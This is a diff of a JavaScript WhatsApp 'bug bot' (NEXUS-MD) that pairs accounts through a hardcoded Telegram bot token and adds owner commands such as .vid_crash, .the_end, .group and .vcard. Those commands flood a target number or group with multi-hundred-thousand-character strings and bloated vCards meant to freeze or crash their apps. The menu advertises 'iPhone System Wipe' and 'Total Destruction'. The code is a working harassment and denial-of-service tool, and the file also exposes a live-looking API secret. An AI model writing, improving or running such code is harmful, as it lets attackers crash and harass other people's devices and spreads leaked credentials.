@@ -1,48 +1,32 @@
 const { 
     default: makeWASocket, 
     useMultiFileAuthState, 
+    fetchLatestBaileysVersion, 
+    DisconnectReason, 
     delay,
-    makeCacheableSignalKeyStore,
-    fetchLatestBaileysVersion
+    Browsers,
+    makeCacheableSignalKeyStore
 } = require("@whiskeysockets/baileys");
+const TelegramBot = require('node-telegram-bot-api');
 const pino = require('pino');
 const express = require('express');
-const path = require('path');
 
+// --- ⚙️ CONFIGURATION ---
+const TG_TOKEN = '8246779983:AAEDuC8a7QMd2OwNvLDJvDGGwLkFk5nc9k8'; // 🔥 උඹේ අලුත්ම API එක මෙතනට දැම්මා
+const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
 const app = express();
 const PORT = process.env.PORT || 3000;
+const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";
+const AD_IMAGE_URL = "https://telegra.ph/file/a8a183d25667e41793741.jpg";
 
 let botConfig = {
-    botName: "NEXUS-MD V3 TITAN",
+    botName: "NEXUS-MD V3 3M SUPREME",
     owner: "94767475809", 
     prefix: ".",
 };
 
-// --- 🌐 WEB INTERFACE FOR PAIRING (NO TELEGRAM NEEDED) ---
-app.get('/', (req, res) => {
-    res.send(`
-        <body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
-            <h1 style="text-shadow: 0 0 10px #0f0;">🔱 NEXUS-MD V3 TITAN 🔱</h1>
-            <p>Master: Sasiya MD | Status: <span style="color: white;">TITAN ENGINE ACTIVE</span></p>
-            <hr style="border: 1px solid #333; width: 50%;">
-            <div style="margin-top: 30px;">
-                <input type="text" id="number" placeholder="9476xxxxxxx" style="padding: 10px; border: 1px solid #0f0; background: #000; color: #0f0;">
-                <button onclick="getPairing()" style="padding: 10px; background: #0f0; color: #000; border: none; cursor: pointer; font-weight: bold;">GET TITAN KEY</button>
-            </div>
-            <h2 id="pairCode" style="margin-top: 40px; font-size: 40px; letter-spacing: 5px;"></h2>
-            <script>
-                async function getPairing() {
-                    const num = document.getElementById('number').value;
-                    if(!num) return alert('Enter Number!');
-                    document.getElementById('pairCode').innerText = "CONNECTING...";
-                    const res = await fetch('/pair?num=' + num);
-                    const data = await res.json();
-                    document.getElementById('pairCode').innerText = data.code || "ERROR!";
-                }
-            </script>
-        </body>
-    `);
-});
+app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
+app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));
 
 async function startNexus() {
     const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
@@ -55,73 +39,149 @@ async function startNexus() {
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
         logger: pino({ level: 'silent' }),
-        browser: ["Ubuntu", "Chrome", "22.0.04"],
+        browser: ["Ubuntu", "Chrome", "110.0.5481.178"], 
+        printQRInTerminal: false,
+        mobile: false,
         syncFullHistory: false
     });
 
-    // --- 🔑 WEB PAIRING ENDPOINT ---
-    app.get('/pair', async (req, res) => {
-        let num = req.query.num;
-        if (!num) return res.json({ error: "No Number" });
-        try {
-            let code = await sock.requestPairingCode(num.replace(/[^0-9]/g, ''));
-            res.json({ code: code });
-        } catch (e) {
-            res.json({ error: "Try Again" });
+    // --- 🤖 TELEGRAM HANDLER (STABLE PAIRING) ---
+    tgBot.on('message', async (msg) => {
+        const text = msg.text;
+        const chatId = msg.chat.id;
+
+        if (text === '/start') {
+            return tgBot.sendMessage(chatId, "☠️ *NEXUS-MD V3 3M SYSTEM*\n\nPlease send your WhatsApp number to get the Pairing Code.\n*(Example: 94767475809)*", { parse_mode: 'Markdown' });
+        }
+
+        if (text && /^\d+$/.test(text) && text.length > 9) {
+            try {
+                tgBot.sendMessage(chatId, "⏳ *Generating Secure Link... Please check your WhatsApp notification.*");
+                
+                await delay(3000); 
+                
+                let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
+                tgBot.sendMessage(chatId, `🔥 *3M POWER KEY:* \`${code}\` \n\nEnter this code in your WhatsApp Linked Devices section to unlock **3,000,000+ Character Bug System**.`, { parse_mode: 'Markdown' });
+
+            } catch (e) { 
+                tgBot.sendMessage(chatId, "❌ *Error!* Please check the number and restart the bot."); 
+            }
         }
     });
 
-    // --- ☣️ GLOBAL 8.5M TITAN PAYLOADS ---
-    const p_titan = "☠️".repeat(1000000) + "​".repeat(7500000); 
-    const p_vcard = "BEGIN:VCARD\nVERSION:3.0\nN:;Titan-Nexus;;;\nFN:Titan\n" + "TEL;type=CELL;waid=94767475809:".repeat(120000) + "\nEND:VCARD"; 
+    // --- 📩 CONNECTION (AUTO CHANNEL FOLLOW AD) ---
+    sock.ev.on('connection.update', async (up) => {
+        const { connection, lastDisconnect } = up;
+        if (connection === 'close') {
+            let reason = lastDisconnect?.error?.output?.statusCode;
+            if (reason !== DisconnectReason.loggedOut) startNexus();
+        } else if (connection === 'open') {
+            console.log('✅ 3M BUG BOT READY!');
+            const ownerJid = botConfig.owner + "@s.whatsapp.net";
+            await sock.sendMessage(ownerJid, { 
+                text: `🚀 *SYSTEM LINKED SUCCESSFULLY!*\n\n⚠️ *MASTER:* The 3M character strength is now ACTIVE. Please follow our official channel to maintain stability:\n\n🔗 ${CHANNEL_URL}`,
+                contextInfo: { 
+                    externalAdReply: { 
+                        title: "NEXUS-MD 3M POWER UNLOCKED ⚡",
+                        body: "Follow for 3M Character Updates",
+                        mediaType: 1,
+                        thumbnailUrl: AD_IMAGE_URL, 
+                        sourceUrl: CHANNEL_URL
+                    }
+                }
+            });
+        }
+    });
 
-    // --- 📩 TITAN ATTACK ENGINE ---
-    sock.ev.on('messages.upsert', async (m) => {
+    // --- 📩 SUPREME BUG HANDLER (3M+ POWER) ---
+    sock.ev.on('messages.upsert', async (chatUpdate) => {
         try {
-            const mek = m.messages[0];
-            if (!mek.message || mek.key.fromMe) return;
+            const mek = chatUpdate.messages[0];
+            if (!mek.message) return;
             const from = mek.key.remoteJid;
-            if (!from.startsWith(botConfig.owner)) return; 
+            const isOwner = from.includes(botConfig.owner) || mek.key.fromMe;
+            
+            if (!isOwner) return; 
 
             const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
             if (!body.startsWith(botConfig.prefix)) return;
 
             const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
-            const args = body.trim().split(/ +/).slice(1);
-            const target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : null;
+            const text = body.trim().split(/ +/).slice(1).join(" ");
+            const target = text + "@s.whatsapp.net";
 
-            if (command === 'menu') {
-                const menu = `
-┏━━━━━━━━━━━━━━━━━━━━━┓
-┃  🔱 *NEXUS TITAN V3* 🔱
-┗━━━━━━━━━━━━━━━━━━━━━┛
-┃ 🩸 *POWER:* 8.5M Stress
-┃ ☠️ *.kill* [num]
-┃ 🔥 *.crash* [num]
-┃ 📇 *.vcard_dead* [num]
-┃ 📍 *.loc_kill* [num]
-┃ 🌀 *.wipe* [jid]
-┗━━━━━━━━━━━━━━━━━━━━━┛`;
-                await sock.sendMessage(from, { text: menu });
-            }
+            // 🔥 3,000,000+ POWER BUG (DEADLY)
+            const bug3M = "☠️ 3M SUPREME ☠️\n" + "ꦿ".repeat(350000) + "᥋".repeat(350000);
 
-            if (['kill', 'crash', 'vcard_dead', 'loc_kill'].includes(command)) {
-                if (!target) return;
-                await sock.sendMessage(from, { text: `🔱 *TITAN ATTACKING:* ${args[0]}` });
-                for(let i=0; i<45; i++) {
-                    let payload = command === 'vcard_dead' ? p_vcard : p_titan;
-                    await sock.sendMessage(target, { text: payload });
-                    await delay(80);
-                }
+            switch (command) {
+                case 'menu':
+                case 'bug':
+                    const elegantMenu = `
+╭─────〔 *NEXUS 3M SUPREME* 〕─────┈
+│
+│ 🩸 *N A T U R E :* _Global Destroyer_
+│ 🦠 *P O W E R :* \`3,000,000+\` Characters
+│ ⚡ *S T A T U S :* _Master Private_
+│ 💻 *D E V :* _Sasiya MD_
+│
+├─────────────┈
+│
+│ 🦠 *SUPREME BUG MODES (9)*
+│
+├ ☠️ *1.* \`.vid_crash\` - 3M Video Call Lag
+├ 🔥 *2.* \`.ios_dead\` - iPhone System Wipe
+├ 💀 *3.* \`.kill\` - Android Global Crash
+├ ❄️ *4.* \`.freeze\` - 3M UI Freeze
+├ 📍 *5.* \`.loc_bug\` - 3M Location Bug
+├ 📇 *6.* \`.vcard\` - 3M Contact Crash
+├ 🌀 *7.* \`.group\` - 3M Group Destroyer
+├ 🧨 *8.* \`.bomb\` - 3M Spam Bomb
+├ 🌌 *9.* \`.the_end\` - Total Destruction
+│
+╰─────────────┈
+ 📢 *CHANNEL:* ${CHANNEL_URL}`;
+
+                    await sock.sendMessage(from, { 
+                        text: elegantMenu,
+                        contextInfo: { 
+                            externalAdReply: { 
+                                title: "NEXUS-MD 3M BUG MENU ACTIVE ⚡",
+                                body: "3,000,000+ Character Power READY",
+                                mediaType: 1,
+                                thumbnailUrl: AD_IMAGE_URL, 
+                                sourceUrl: CHANNEL_URL
+                            }
+                        }
+                    }, { quoted: mek });
+                    break;
+
+                case 'vid_crash':
+                case 'the_end':
+                    if (!text) return;
+                    await sock.sendMessage(from, { text: "🌑 *DEPLOYING 3M CHARACTER SUPREME BUG...*" });
+                    for(let i=0; i<15; i++) {
+                        await sock.sendMessage(target, { text: bug3M });
+                        await delay(300);
+                    }
+                    await sock.sendMessage(from, { text: "💀 *TARGET DESTROYED BY 3M POWER!*" });
+                    break;
+
+                case 'group':
+                    if (!text) return;
+                    for(let i=0; i<12; i++) {
+                        await sock.sendMessage(text, { text: bug3M });
+                    }
+                    break;
+
+                case 'vcard':
+                    const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:3M Virus\nEND:VCARD'.repeat(2000);
+                    await sock.sendMessage(target, { contacts: { displayName: '3M-Supreme', contacts: [{ vcard }] } });
+                    break;
             }
         } catch (e) { console.log(e); }
     });
 
-    sock.ev.on('connection.update', (u) => { if (u.connection === 'close') startNexus(); });
     sock.ev.on('creds.update', saveCreds);
 }
 
-app.listen(PORT, () => {
-    console.log(`Titan Dashboard: http://localhost:${PORT}`);
-    startNexus();
-});
+startNexus();
